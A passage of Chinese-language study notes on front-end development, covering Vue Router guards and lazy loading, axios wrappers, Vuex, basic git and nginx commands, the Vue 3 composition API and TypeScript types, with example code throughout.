     - 上面是浏览器自带的，但是存在问题：**如果不是#这种路由模式，该方案就失效了**，所以推荐使用vue自带的

       ```
       this.$router.push("/detail")
       ```
   - 使用范围：

     - 如果是固定的几个：声明式导航
     - 如果有很多选项：编程式导航
     - `this.$router === router`
9. 列表到详情页开发流程

   ![在这里插入图片描述](https://img-blog.csdnimg.cn/2795c2b131784d71b4c42901769f2b27.png)

   - 动态路由 index.js

     ```
     {
         // 动态路由
         path: '/detail/:myid',
         component: Detail
       },
     ```
   - 拿到路由后面的通配符：`this.$route.params.名称（比如myid）`
   - 命名路由

     ```
     {
         // 动态路由
         name: "detail",  // 命名路由
         path: '/detail/:myid',
         component: Detail
       },
     ```

     通过命名路由跳转

     ```
     this.$router.push({
             name: "detail",
             params: {
               myid: id,
             },
           });
     ```
   - 重定向：

     - `{path: '/a', redirect: {name: 'foo'}}`
     - `{path: '/a', redirect: '/b'}`
   - 别名：`{path: '/a', component: A, alias: '/b'}`，当访问 `/b` 时，url保持为 `/b` ，但是路由匹配为 `/a`
   - 如果路由中带 `#` ，那么一定是前端路由；不带的话，不好判断

     - 如果不想要很丑的 hash，我们可以用路由的 **history 模式**，这种模式充分利用history.pushstate API 来完成 URL跳转而无须重新加载页面
     - 使用 history 需要注意：如果后台没有正确的配置，浏览器看到url后会给后端发请求，这时候就会404，**浏览器不知道这是前端路由还是后端路由**
     - 为了解决上述问题，需要在服务器增加一个覆盖所有情况的候选资源：如果URL匹配不到任何静态资源，则应该返回同一个 `index.html` 页面，这个页面就是app依赖的页面
     - 有的软件在分享的时候会自动给url加上 `#` ，所以不能用 hash 的路由，否则会出问题，所以history路由很关键
   - 返回上一页：`this.$router.back()`
10. 路由拦截

    - 全局拦截

      ```
      router.beforeEach((to, from, next) => {
        if (某几个需要授权的路由) {
          if (授权通过) {
            next()
          } else {
            next("/login")
          }
        } else {
          next()
        }
      })
      ```
    - 拦截后重定向到原来的页面

      1. next中需要写 `query`参数

         ```
         next({
                 path: "/login",
                 query: {
                   redirect: to.fullPath
                 }
               })
         ```
      2. 登录页面中，登录完后，跳转到redirect保存的url去

         ```
         handleLogin() {
               setTimeout(() => {
                 localStorage.setItem("token", "asdfasdf");
                 // this.$router.back();
         
                 // 1. 获取 query 字段
                 console.log(this.$route.query.redirect);
                 // 2. 跳转到当时想要跳的页面去
                 this.$router.push(this.$route.query.redirect);
               }, 0);
             }
         ```
    - 局部拦截

      - 路由独享的守卫：对某些路由单独进行守卫

        ```vue
        {
            path: '/center',
            component: Center,
            meta: {
              isRequired: true,
            },
            beforeEach: (to, from, next) => {
              next()
            }
          },
        ```
      - 组件内的守卫：对组件内的路由进行控制，**路由生命周期**

        ```
          beforeRouteEnter(to, from) {
            // 在渲染该组件的对应路由被验证前调用
            // 不能获取组件实例 `this` ！
            // 因为当守卫执行时，组件实例还没被创建！
          },
          beforeRouteUpdate(to, from) {
            // 在当前路由改变，但是该组件被复用时调用
            // 举例来说，对于一个带有动态参数的路径 `/users/:id`，在 `/users/1` 和 `/users/2` 之间跳转的时候，
            // 由于会渲染同样的 `UserDetails` 组件，因此组件实例会被复用。而这个钩子就会在这个情况下被调用。
            // 因为在这种情况发生的时候，组件已经挂载好了，导航守卫可以访问组件实例 `this`
          },
          beforeRouteLeave(to, from) {
            // 在导航离开渲染该组件的对应路由时调用
            // 与 `beforeRouteUpdate` 一样，它可以访问组件实例 `this`
          },
        ```
11. 路由懒加载

    - 不要用直接导入：`import Login from '@/views/Login'`
    - 在用的时候导入：

      ```
        {
            path: '/order',
            component: () => import("@/views/Order"),
            meta: {
              isRequired: true,
            }
          }
      ```
12. 路由原理

    1. hash 路由
       - location.hash：切换
       - window.onhashchange：监听路径的切换
    2. history 路由
       - history.pushState：切换
       - window.onpopstate：监听路径的切换

## 10. 小练习和组件库

1. rem

   - 由于设备dpr的原因，所以在设计的时候，需要根据dpr的大小进行缩放
   - 一般为2，所以长宽在设计的时候 ➗ 2
   - dpr：device pixel ratio
   - 可布局的宽度：`document.documentElement.clientWidth`
   - 设置根节点的fontsize：`document.documentElement.style.fontSize='100px'`
   - rem是基于根节点进行比例缩放的
   - 所以rem基于的值应该针对不同的设备是变化的，这里就要设成可布局的宽度 ➗ 设计稿实际宽度（未缩放的，比如750）✖ 100 px，以根节点的100为单位
   - 除此之外，还有不 ✖ 100，而是 ✖ 16，这样是以字体大小为基准的，因为字体是16；100好算，16不好算
2. swiper

   - components里面放公共的组件，或者当前组件的孩子组件
   - views里面放页面的vue
   - 如果只是单纯的 `new Swiper` 的话，用lint会报错 `no-new` ，因此可以在 `.eslintrc.js` 中关掉对应的rules
   - 同理，可以关掉未用变量的规则

     ```js
     rules: {
         'no-console': process.env.NODE_ENV === 'production' ? 'warn' : 'off',
         'no-debugger': process.env.NODE_ENV === 'production' ? 'warn' : 'off',
         'no-new': 'off',
         'no-unused-vars': 'off'
       }
     ```
3. 选项卡封装

   1. public下的东西都可以直接通过 `/` 来找到
   2. assets下的东西是通过模块化的方式来找到

      ```html
      <script>
      	import '../assets/iconfont/iconfont.css'
      	export default {}
      </script>
      ```

      以模块的方式导入的样式，都会做成 style 内部样式 插到head中
4. 透传

   - vue可以实现，在组件上加class，实际上传递到了组件内部最外面的tag上（跳过最外层的div）
   - react做不到
5. 吸顶功能：往下滑的时候，菜单黏在顶部

   - top设置为0的时候，开始粘

     ```css
     .sticky {
       position: sticky;
       top: 0px;
       background: white;
     }
     ```
   - position一共有6个值

     - static
     - relative
     - absolute
     - fixed
     - sticky
     - inherit：继承父属性
6. 对于axios封装

   1. 直接对于数据请求的封装

      ```js
      import axios from "axios"
      function http() {
          return axios({
              url: "https://m.maizuo.com/gateway?cityId=440300&pageNum=1&pageSize=10&type=1&k=3602463",
              headers: {
                  "X-Client-Info":
                      '{"a":"3000","ch":"1002","v":"5.2.1","e":"1689149181904756335738881"}',
                  "X-Host": "mall.film-ticket.film.list",
              },
          })
      }
      
      export default http
      ```
   2. axios自带的封装方案

      ```js
      
      import axios from "axios"
      const http = axios.create({
          baseURL: "https://m.maizuo.com/gateway?cityId=440300&pageNum=1&pageSize=10&type=1&k=3602463",
          timeout: 10000,
          headers: {
              "X-Client-Info":
                  '{"a":"3000","ch":"1002","v":"5.2.1","e":"1689149181904756335738881"}',
              "X-Host": "mall.film-ticket.film.list",
          },
      })
      
      export default http
      ```
   3. 还可以在发请求之前拦截：showLoading
   4. 在成功后拦截：hideLoading
7. 动态绑定style，实现图像展示

   ```js
   <div
     :style="{
       backgroundImage: 'url(' + filmInfo.poster + ')',
     }"
     class="poster"
   ></div>
   ```

   CSS 属性 `background-size: cover;` 可以使背景图片自动缩放和裁剪到完全覆盖背景区域。具体表现为：

   - 如果背景图片比背景区域更宽或更高，那么 `background-size: cover;` 属性值会自动适应并缩小图片，以便完全覆盖整个背景区域。
   - 如果背景图片比背景区域更小或比例不对，那么 `background-size: cover;` 属性值会自动按比例拉伸图片，并裁剪多余的部分，以便完全覆盖背景区域。 该属性通常用于自适应响应式设计，可以使背景始终完全填充背景区域，在不同设备和屏幕尺寸下都有良好的显示效果。用法示例：

   ```css
   .background {
     background-image: url(my-background-image.jpg);
     background-size: cover;
   }
   ```
8. 轮播图父传子会出现的bug：

   - `<detail-swiper :perview="2">`，不同的组件中的props值不同，但是界面显示的并没有实现
   - 解决方案：`new Swiper`的类名使用动态的

     ```js
     <div class="swiper-container" :class="name">
     
     mounted() {
         new Swiper("." + this.name, {
           slidesPerView: this.perview,
           spaceBetween: 30,
           freeMode: true,
         });
       },
     ```
9. 指令的最佳实践，根据滚动的距离，对绑定的tag进行隐藏和显示

   ```js
   Vue.directive("scroll", {
     inserted(el, binding) {
       // el是绑定在谁身上，就拿到谁的dom节点
       // console.log(el, binding);
       el.style.display = "none";
   
       window.onscroll = () => {
         if (
           (document.documentElement.scrollTop || document.body.scrollTop) >
           binding.value
         ) {
           el.style.display = "block";
         } else {
           el.style.display = "none";
         }
       };
     },
   
     // 销毁执行
     unbind() {
       window.onscroll = null;
     },
   });
   ```
10. 利用 `better-scroll`进行滚动优化
11. 限制浏览器滚动

    ```css
    .box {
      height: 300px;
      overflow: hidden;
    }
    ```
12. 防止初始化过早

    ```js
    mounted() {
        http({
          url: "/gateway?cityId=440300&ticketFlag=1&k=4312294",
          headers: {
            "X-Host": "mall.film-ticket.cinema.list",
          },
        }).then((res) => {
          console.log(res.data.data.cinemas);
          this.cinemaList = res.data.data.cinemas;
    
          this.$nextTick(() => {
            new BetterScroll(".box");
          });
        });
      },
    ```
13. BetterScroll增加滚动bar，fade：自动隐藏

    ```js
    new BetterScroll(".box", {
              scrollbar: {
                fade: true,
              },
            });
    ```
14. 修正滚动条的位置：`position: relative`
15. 通过给组件加 `ref`，获取当前组件中tag的 `offsetHeight`

    ```
    <tabbar ref="mytabbar"></tabbar>
    
    mounted() {
        console.log(111111, this.$refs.mytabbar.$el.offsetHeight);
        }
    ```
16. 组件库

    1. element-ui：PC端，饿了吗团队推出
    2. vant：移动端，有赞技术团队推出

       - 使用下述代码，可以全局初始化Vant，不需要再引入组件

         ```
         import Vant from "vant";
         import "vant/lib/index.css";
         Vue.use(Vant);
         ```
17. 数据懒加载：直接用vant的列表

    - 详情页面返回会出现 **触发到底的事件**，这是因为onLoad是瞬间执行的，而mounted中的axios是异步等待返回结果的
    - 为了解决上述问题，则需要onLoad函数中的【总长度匹配禁用懒加载】的total（从axios请求返回的值）不为0，即等待axios加载完了之后再走这一部分逻辑

      ```js
      if (this.datalist.length === this.total && this.total != 0) {
              this.finished = true;
              return;
            }
            console.log("到底了");
            this.current++;
      ```
18. loading框：在axios加载数据完毕后消失，在发请求之前加载，在发请求之后关闭

    ```js
    import axios from "axios"
    import { Toast } from "vant";


    const http = axios.create({
        baseURL: "https://m.maizuo.com",
        timeout: 10000,
        headers: {
            "X-Client-Info":
                '{"a":"3000","ch":"1002","v":"5.2.1","e":"1689149181904756335738881"}',
            // "X-Host": "mall.film-ticket.film.list",
        },
    })
    
    // 添加请求拦截器
    http.interceptors.request.use(function (config) {
        // 在发送请求之前做些什么
        Toast.loading({
            message: "加载中...",
            forbidClick: true,
            duration: 0,
        });
        return config;
    }, function (error) {
        // 对请求错误做些什么
        return Promise.reject(error);
    });
    
    // 添加响应拦截器
    http.interceptors.response.use(function (response) {
        // 对响应数据做点什么
    
        // 隐藏加载
        Toast.clear();
        return response;
    }, function (error) {
        // 对响应错误做点什么
        return Promise.reject(error);
    });
    ```
19. 传统的多页面跳转方案：

    - `location.href = '#/cinemas?cityname=' + item.name`
    - cookie、localStorage
20. 单页面方案

    - 中间人模式
    - bus事件总线方案：`$on`、`$emit`

## 11. vuex

1. 状态管理模式，管理公共状态，保存到内存里，刷新就没了（浏览器的设置）

   ![](https://vuex.vuejs.org/vuex.png)
2. [vue-devtools最新版本安装教程（vue-devtools6.5.0）](https://blog.csdn.net/weixin_44315181/article/details/131580858)
3. vue-devtools 5.1.1为教程版本
4. vuex可以管理保存公共状态（分散在各个组件内的状态，统一管理）
5. vuex默认是管理在内存中，一刷新页面，公共状态就丢失了
6. vuex 项目应用

   - 非父子的通信
   - 后端数据的缓存快照，减少重复数据请求，减轻服务器压力，提高用户体验
7. mutations中不支持异步，只能支持同步；能支持异步和同步的是actions
8. 注意：

   1. 应用层级的状态应该集中到单个store对象中
   2. 提交mutation是更改状态的唯一方法，并且这个过程是同步的
   3. 异步逻辑都应该封装到action里面
9. vuex的第二种写法

   - state：单一状态树，每个应用将仅仅包含一个store实例

     - `this.$store.state.状态名字`
     - `...mapState(["title"])`

       ```
       computed: {
           ...mapState(["cinemaList"]),
         },
       // 或者
       computed: mapState(["cinemaList"]),
       
         // 使用
         this.cinemaList
       ```

       - `mapState`：函数返回的是store.state的对象
       - 然后使用 `...` 可以解构结构体（解构字典）
     - `mapActions`、`mapMutations`同理，不过不是放在computed中，而是放在methods中
10. 底部选项卡控制

    1. 普通实现：在mounted时提交修改 v-show 的变量为false的mution；在destoryed时提交修改 v-show 的变量为true 的mution
    2. 混入实现：mixin，建一个对象，将上述过程中的mounted/created/destoryed写入改对象中，然后将改对象混入其中

       ```js
       export default {
       	mixins: [obj],
       	data(){},
       	mounted(){},
       	...
       }
       ```
11. vuex的持久化

    1. `vuex-persistedstate`
    2. 下载：`cnpm i --save vuex-persistedstate`
    3. 使用：

       - 在 `store/index.js` 中导入：`import createPersistedState from 'vuex-persistedstate'`
       - 在 `Vuex.Store` 中增加插件 `plugins: [createPersistedState()],`
    4. 原理：每次存的时候，都会在localstorage中存一份
    5. 默认是 localstorage，可以改为别的，比如 `window.sessionStorage`；默认是全部存储，可以通过 方法 `reducer` 只存储state中的部分数据

       ```js
       export default new Vuex.Store({
         plugins: [createPersistedState({
           reducer: (state) => {
             return {
               cityId: state.cityId,
               cityName: state.cityName
             }
           }
         })],
         ...
       )}
       ```

## 12. git

1. 代码管理工具

   1. 传统：u盘，app，飞秋，compare
   2. svn，集中式代码管理工具
   3. git，分布式代码管理工具

   ![在这里插入图片描述](https://img-blog.csdnimg.cn/d5c447f3a41241c989689f0ab4e01159.png)
   
2. `git init`：初始化本地仓库

3. `git add`：代码区 -> 暂存区

4. `git commit`：暂存区 -> 本地仓库

5. `git log`：查看提交记录

6. `git reset --hard HEAD^`：回退上一个版本，两个^就是回退两个版本

7. `git reflog`：操作记录

8. `git reset --hard 六位版本号`：回退指定版本（**可根据操作记录进行后悔**）

9. `git diff 文件名`：查看当前代码和仓库中的代码有何不同

10. `git branch -a`：查看所有分支

11. `git checkout -b 分支名`：创建新分支并切换

12. `git checkout 分支`：切换到分支

13. `git push origin 分支`：推送分支到远程仓库分支

14. `git push origin master:分支`：推送master到远程的分支

14. `git push origin 分支:分支`：推送分支到远程的分支

14. `git push origin :分支`：删除远程的分支

14. `git branch -d 分支`：删除本地的分支

18. `git merge 分支`：将分支合并到主分支

15. `git remote add origin 远程Git仓库地址`：将本地项目连接到远程的git仓库

## 13. nginx

1. nginx：高性能反向代理服务器
2. vue项目部署流程
   1. `npm run build`：vue文件输出
   2. 将 `build` 文件夹拷贝到nginx目录下
   3. 进入 `conf` 复制一份nginx.conf，并重命名，修改配置中的 server 中的 location 中的 `root dist` ，这个dist就是目标路径
3. `nginx.exe -c .\conf\liyingjun.conf`：启动nginx
4. `nginx.exe -s stop`：停止
5. `nginx.exe -s reload`：重启
5. 配置好了，可以直接带着nginx复制到服务器上运行

## 14. Vue3

1. 注册和挂载不一样，vue3使用了createApp

2. 路由使用createRouter函数
   1. `createWebHistory`：斜杠路由模式，history模式
   2. `createWebHashHistory`：#路由模式，hash模式

3. vuex同上，使用createStore

4. **组合式API**：react 类和函数写法（不支持状态，生命周期等，支持属性） ——》 react hooks（钩住函数写法的状态） ——》 vue3-hooks（即：composition api，见不到this了）

   1. `setup`：代替了vue3老写法或者vue2写法中，`beforeCreate` 和 `created` 生命周期

   2. `reactive`：创建响应式对象，类似模板中的状态（如果参数是字符串、数字会报警告）

   3. 如果同时使用 老式的 `data(){}` 和 组合式的 `setup(){}` ，定义的变量和生命周期会同时生效
      - 在 `setup` 中没有this
      - 两套东西不建议混用
      - `reactive`：可以写多个

   4. template里可以写多个div 兄弟节点

   5. `ref`：

      - 过去 vue2中 dom 的引用

        ```
        <input type="text" ref="mytextref">
        
        mounted() {
                console.log("mounted", this.$refs.mytextref);
        },
        ```

      - 在新版vue3中，同样可以获取dom对象，但是需要通过 `.value` 拿到dom对象

        ```
        const mytextref = ref()
        
        return {
                    mytextref
                }
        ```

      - 在新版vue3中，通过ref跟踪变量，从而对组件进行赋值

        ```vue
        <template>
            <div>
                <input type="text" ref="mytext">
                <button @click="handleAdd">add</button>
        
                <ul>
                    <li v-for="data in datalist" :key="data">
                        {{ data }}
                    </li>
                </ul>
            </div>
        </template>
        
        <script>
        import { ref } from "vue";
        export default {
            setup() {
                const mytext = ref()
                const datalist = ref([111, 222])
        
                const handleAdd = () => {
                    console.log(mytext.value.value);
                    datalist.value.push(mytext.value.value)
                    mytext.value.value = ''
                }
        
                return {
                    handleAdd,
                    mytext,
                    datalist
                }
            }
        }
        </script>
        ```

   6. `toRefs`：解决 `ref` 和 `reactive` 的最佳实践，reactive可以自动展开，但是不支持简单类型（int、str啥的）；ref啥都能用，但是不能自动展开，很难受。【但是】toRefs可以支持：

      - 定义阶段：使用 reative

      - return阶段：使用 `..toRefs()`，将变量解包为多个ref对象

      - 直接取长补短，我愿称之为绝杀

        ```vue
        <template>
            <div>
                {{ myname }}
                <button @click="handleClick">change</button>
            </div>
        </template>
        
        <script>
        import { reactive, toRefs } from 'vue'
        export default {
            setup() {
                console.log("setup");
        
                // 定义状态
                const obj = reactive({
                    myname: "kerwin",
                    myage: 100
                })
                const handleClick = () => {
                    obj.myname = "liyingjun"
                }
        
                return {
                    handleClick,
                    ...toRefs(obj)
                }
            }
        }
        </script>
        ```

   7. `props`：父传子解决方案

      1. 定义一个组件，接受参数 props

         ```vue
         <template>
             <div>
                 <button>left</button>
                 navbar -- {{ myname }}
                 <button>right</button>
             </div>
         </template>
         
         <script>
         export default {
             props: ["myname"]
         }
         </script>
         ```

      2. 主界面使用组件，传入参数

         ```vue
         <template>
             <div>
                 通信
                 <navbar myname="home"></navbar>
             </div>
         </template>
         
         <script>
         import navbar from './components/navbar'
         export default {
             components: {
                 navbar
             }
         }
         </script>
         ```

      3. 如果是在mounted中想要拿到这个值，或者是在setup中想要处理逻辑中包含这个值，常见的vue2和vue3写法如下

         ```
         mounted() {
                 console.log("222", this.myid);
             },
         
         setup(props) {
         	console.log(props.myid);
         }
         ```

         - setup默认传入第一个参数就是props的list
         - setup比mounted的调用时间要早

   8. `emit`：子传父解决方案

      1. 触发的来源组件中，定义触发的函数，函数体内写 `emit` ，传参对应的事件名

         ```vue
         <template>
             <div>
                 <button @click="handleShow">left</button>
                 navbar -- {{ myname }}
                 <button>right</button>
             </div>
         </template>
         
         <script>
         export default {
             props: ["myname", "myid"],
             mounted() {
                 console.log("222", this.myid);
             },
         
             setup(props, { emit }) {
                 console.log(props.myid);
         
                 const handleShow = () => {
                     emit("event")
                 }
         
                 return {
                     handleShow
                 }
             }
         }
         </script>
         ```

      2. 在被影响的组件，一般是主页的组件上，给调用触发组件的 dom 上定义事件名及其绑定的函数名，在script中编写函数的具体实现

         ```vue
         <template>
             <div>
                 通信
                 <navbar myname="home" myid="111" @event="change"></navbar>
                 <sidebar v-show="obj.isShow"></sidebar>
             </div>
         </template>
         
         <script>
         import navbar from './components/navbar'
         import sidebar from './components/sidebar'
         import { reactive } from "vue";
         export default {
             components: {
                 navbar,
                 sidebar
             },
         
             setup() {
                 const obj = reactive({
                     isShow: true
                 })
         
                 const change = () => {
                     obj.isShow = !obj.isShow
                 }
         
                 return {
                     obj,
                     change
                 }
             }
         }
         </script>
         ```

      3. 选要注意的是，在vue2中 调用触发 的组件中，`emit`的写法是 `this.$emit()`，而在vue3中，类似props传参一样，第二个参数默认为闭包的 `emit`，所以第二个参数以 解包 的形式 获取 emit：`setup(props, { emit }) {...}`

   9. 生命周期

      - 第一套跟vue2是一样的，不过最后的 destory 相关的 要变成 unMounted

        |    原方法     |     升级后      |
        | :-----------: | :-------------: |
        | beforeCreate  |      setup      |
        |    created    |      setup      |
        |  beforeMount  |  onBeforeMount  |
        |    mounted    |    onMounted    |
        | beforeUpdate  | onBeforeUpdate  |
        |    updated    |    onUpdated    |
        | beforeDestroy | onBeforeUnmount |
        |   destroyed   |   onUnmounted   |

      - 例子

        ```vue
        <template>
            <div>
                生命周期
                <ul>
                    <li v-for="data in obj.list" :key="data">
                        {{ data }}
                    </li>
                </ul>
            </div>
        </template>
        
        <script>
        import axios from 'axios'
        import { onBeforeMount, onMounted, reactive } from "vue";
        export default {
            // mounted
            setup() {
                const obj = reactive({
                    list: []
                })
                onBeforeMount(() => {
                    console.log("上树之前就执行啦");
                })
                onMounted(() => {
                    console.log("dom上树", "axiox，事件监听啊，setInterval启动啊啥的");
                    setTimeout(() => {
                        obj.list = ["aaa", "bbb"]
                    }, 2000);
                })
        
                return { obj }
            }
        }
        </script>
        ```

   10. 计算属性

       1. 使用函数调用的方法，vmodel绑定的变量发生改变，导致函数被调用，从而列表对应的数据更新，然后更新界面的列表显示

          ```vue
          <template>
              <div>
                  <input type="text" v-model="obj.mytext">
                  <ul>
                      <li v-for="data in filterlist()" :key="data">
                          {{ data }}
                      </li>
                  </ul>
              </div>
          </template>
          
          <script>
          import { reactive } from "vue";
          export default {
              setup() {
                  const obj = reactive({
                      mytext: '',
                      datalist: ["aaa", "bbb", "ccc", "bcc", "bcd", "abb"]
                  })
                  const filterlist = () => {
                      return obj.datalist.filter(item => item.includes(obj.mytext))
                  }
          
                  return {
                      obj,
                      filterlist
                  }
              }
          }
          </script>
          ```

       2. 使用计算属性来实现上述功能

          ```vue
          <template>
              <div>
                  <input type="text" v-model="obj.mytext">
                  <ul>
                      <li v-for="data in computedList" :key="data">
                          {{ data }}
                      </li>
                  </ul>
              </div>
          </template>
          
          <script>
          import { reactive, computed } from "vue";
          export default {
              setup() {
                  const obj = reactive({
                      mytext: '',
                      datalist: ["aaa", "bbb", "ccc", "bcc", "bcd", "abb"]
                  })
          
                  const computedList = computed(() => {
                      return obj.datalist.filter(item => item.includes(obj.mytext))
                  })
          
                  return {
                      obj,
                      computedList
                  }
              }
          }
          </script>
          ```

       3. 如果在template中使用多次，函数的写法会调用多次，而计算属性只调用一次（有缓存机制，性能优化）

       4. vue2中计算属性的写法为

          ```js
          computed(){
          	aaa(){
          		return "111"
          	}
          }
          ```

   11. watch

       1. 与computed注重结果不一样，watch注重的是过程

       2. [VUE3 中的 Watch 详解](https://zhuanlan.zhihu.com/p/465651353)

       3. 使用方法

          ```vue
          <template>
              <div>
                  <input type="text" v-model="obj.mytext">
                  <ul>
                      <li v-for="data in obj.datalist" :key="data">
                          {{ data }}
                      </li>
                  </ul>
              </div>
          </template>
          
          <script>
          import { reactive, watch } from "vue";
          export default {
              setup() {
                  const obj = reactive({
                      mytext: '',
                      datalist: ["aaa", "bbb", "ccc", "bcc", "bcd", "abb"],
                      oldlist: ["aaa", "bbb", "ccc", "bcc", "bcd", "abb"]
                  })
          
                  watch(() => obj.mytext, () => {
                      console.log("watch");
                      obj.datalist = obj.oldlist.filter(item => item.includes(obj.mytext))
                  })
          
                  return {
                      obj
                  }
              }
          }
          </script>
          ```

5. 自定义hooks写法：`setup`

   1. 虽然 composition api 比之前写法看上去好像更加麻烦了，但是用上自定义hooks就可以实现函数编程的复用了，更加简洁高效。

   2. 简单来说，就是把一些复杂的逻辑和流程可以提取出js放到外面处理，主vue文件中只写逻辑和调用函数即可

      ```vue
      <template>
          <div>
              app
              <ul>
                  <li v-for="data in obj1.list" :key="data.name">
                      {{ data.name }}
                  </li>
              </ul>
              <ul>
                  <li v-for="data in obj2.list" :key="data.name">
                      {{ data.name }}
                  </li>
              </ul>
          </div>
      </template>
      
      <script>
      import { getData1, getData2 } from './module/app'
      
      export default {
          setup() {
              const obj1 = getData1()
              const obj2 = getData2()
      
              return {
                  obj1,
                  obj2
              }
          }
      }
      </script>
      ```

   3. 跳转：`this.$router.push()` 替换为 `router.push()`，其中 `const router = useRouter()`，`import {useRouter} from "vue-router"`

   4. 参数获取：与上述类似，不过是 `const route = useRoute()`，然后拿到url中对应的参数：`route.params.id`

   5. 全局状态：也类似，不过换了个库，`import { useStore } from "vuex"`，然后：`const store = useStore()`

      ```vue
      <template>
          <div>
              detail
          </div>
      </template>
      
      <script>
      import { onMounted, onUnmounted } from "vue";
      import { useRoute } from "vue-router";
      import { useStore } from "vuex";
      export default {
          // mounted() {
          //     this.$store.commit("hide")
          //     console.log(this.$route.params.id);
          // },
          // unmounted() {
          //     this.$store.commit("show")
          // },
      
          setup() {
              // route === this.$route
              const route = useRoute()
              // store === this.$store
              const store = useStore()
      
              onMounted(() => {
                  console.log(route.params.id);
                  store.commit("hide")
              })
              onUnmounted(() => {
                  store.commit("show")
              })
          }
      }
      </script>
      ```

6. vuex替代方案：provide、inject

   1. 解决了：需要跨越好几级拿组件状态

   2. vue-composition-api的一个新功能，依赖注入功能

   3. 使用：

      1. 在根组件提供状态的绑定：

         ```js
         const isShow = ref(false)
         
         // 谁想用isShow，就把这个功能注入进来
         provide("kerwinshow", isShow)
         ```

      2. 在子组件中注入状态：

         ```js
         const isShow = inject("kerwinshow")
         ```

      3. 从而实现了状态的全局共享

7. vue3去掉了：

   1. filter 过滤器功能
   2. 中央事件总线bus
   3. 响应式原理基础从：Object.defineProperty -> Proxy
   4. 生命周期替换
   5. options api -> composition api

## 15. ts

1. TypeScript是js的一个超集，主要提供了类型系统和对es6的支持，由微软开发，开源

2. ts：编译型语言；js：解释型语言

3. 优势

   1. 增加了代码的可读性和可维护性
   2. 非常包容，**即使报错了也依然可以编译为js**
   3. 拥有活跃的社区

4. 安装

   1. 全局安装：`cnpm install -g typescript`
   2. 编译：`tsc hello.ts`
   3. 约定 `.ts` 为后缀，编写react时，以 `.tsx` 为后缀
   4. 主流ide中都支持ts，包括代码补全、接口提示、跳转定义、重构

5. 原始数据类型

   - string number boolean null undefined enum（枚举） symbol（符号）
   - 空值一般用 void 表示，void可以表示变量，也可以表示函数的返回值

6. 任意值

   - 任意值：Any，用来表示允许赋值为任意类型
   - 声明一个变量为任意值之后，对它的任何操作，返回的内容的类型都是任意值
   - 变量如果在声明的时候，未指定其类型，那么它会被识别为任意值类型

7. 类型推论

   - ts会依照类型推论的规则推断出一个类型

     ```typescript
     // 给变量赋值初始值的时候，如果没有指定类型，就会根据初始值倒推类型
     var b = 1;
     b = '2'
     ```

   - 如果定义的时候没有赋值，不管之后有没有赋值，都会被推断成 any 类型而完全不被类型检查

     ```typescript
     // 没有给b赋初始值，就是any，var b: any
     var bb;
     bb = 1
     bb = '2'
     ```

8. 联合类型

   - 表示取值可以为多种类型中的一种

   - 如果定义的时候没有赋值，不管之后有没有赋值，都会被推断成any类型而完全不被类型检查

   - 只能访问此联合类型内的所有类型里共有的属性或者方法

     ```typescript
     // 联合类型
     var muchtype: string | number = "hello"
     muchtype = 10
     console.log(muchtype.toString());
     ```

9. 对象类型-接口

   - 可描述类的一部分抽象行为，也可描述对象的构造形状

   - 接口一般首字母大写，有的编程语言上面建议接口的名称加上I前缀

   - 赋值的时候，变量的形状必须要跟接口的形状保持一致

   - 接口中可定义可选属性、只读属性、任意属性

     ```typescript
     // 定义接口 强约束，属性加?：实现可选特征，通过增加[]属性实现不定量属性，这里只能指定any；readonly：只读，不能再赋值
     interface Instate {
         readonly name: string
         age?: number | string,
         [propName: string]: any
     }
     
     var obj1: Instate
     obj1 = {
         name: "1",
         age: 1
     }
     var obj2: Instate
     obj2 = {
         name: "2"
     }
     
     var obj3: Instate
     obj3 = {
         name: "3",
         age: "12",
         sex: "male",
         isMarry: true
     }
     ```

10. 数组类型

    - `类型 []` 表示

    - `Array<elemType>` 数组泛型表示

    - 接口表示

      ```typescript
      var arr: number[] = [1, 2, 3]
      var arr2: string[] = ["1", "2", "3"]
      var arr3: any[] = ["1", 1, true]
      
      var arrType: Array<number> = [1, 2, 3]
      var arrType2: Array<string> = ["1", "2", "3"]
      var arrType3: Array<any> = [1, "2", true]
      
      interface IArray {
          [index: number]: number
      }
      var arrType4: IArray = [1, 2, 3]
      
      interface Istate {
          name: string,
          age: number
      }
      interface IArr {
          [index: number]: Istate
      }
      var arrType5: IArr = [{ name: "1", age: 1 }, { name: "2", age: 2 }]
      var arrType6: Array<Istate> = [{ name: "1", age: 1 }, { name: "2", age: 2 }]
      var arrType7: Istate[] = [{ name: "1", age: 1 }, { name: "2", age: 2 }]
      ```

11. 函数类型

    - 函数约束，有函数本身的参数约束，返回值约束
    
    - 还有函数本身赋值的变量的约束
    
    - 可采用重载的方式才支持联合类型的函数关系
    
      ```typescript
      // 声明式类型的函数
      function f(name: string, age: number): number {
          return age
      }
      var ageNum: number = f("zhangsan", 18)
      // - 函数参数不确定
      function f2(name: string, age: number, sex?: string): number {
          return age
      }
      // - 函数参数的默认值
      function f3(name: string = "张三", age: number = 18): number {
          return age
      }
      
      // 表达式类型的函数
      var f4 = function (name: string, age: number): number {
          return age
      }
      // - 约束方案1
      var f5: (name: string, age: number) => number = function (name: string, age: number): number {
          return age
      }
      // - 约束方案2
      interface i6 {
          (name: string, age: number): number
      }
      var f6: i6 = function (name: string, age: number): number {
          return age
      }
      
      // 重载的方式：联合类型的函数
      function getValue(value: number): number;
      function getValue(value: string): string;
      function getValue(value: string | number): string | number {
          return value
      }
      let a: number = getValue(1)
      ```
    
12. 类型断言

    - 可以用来手动指定一个值的类型：`<类型>值`，或者 `值 as 类型`

    - 在tsx语法（react的jsx语法的ts版）必须采用后面一种

    - 类型断言不是类型转换，断言称一个联合类型中不存在的类型是不允许的

      ```typescript
      // 类型断言，不是强制类型转换
      function getAssert(name: string | number) {
          return (<string>name).length, (name as string).length
      }
      ```

13. 类型别名

    - 给一个类型起一个新的名字

    - 采用关键字 type：`type Name = string | number`

    - 也可以采用type来约束取值只能是某些字符串中的一个：`type EventNames = "click" | "scroll" | "mousemove"`

      ```typescript
      type strType = string | number;
      var str: strType = 10
      str = "10"
      
      interface mt1 {
          name: string
      }
      interface mt2 {
          age: number
      }
      type mt = mt1 | mt2
      var objj: mt = { name: "张三" }
      var objj2: mt = { age: 123 }
      var objj3: mt = { name: "asd", age: 11 }
      
      // 限制字符串的选择
      type sexx = "男" | "女"
      function getSex(s: sexx): string {
          return s
      }
      getSex("男")
      ```

14. 枚举

    - Enum，用于取值被限定在一定范围内的场景

    - 采用关键字enum定义，例如：`enum Days{Sun, Mon, Tue, Wed, Thu, Fir, Sat}`

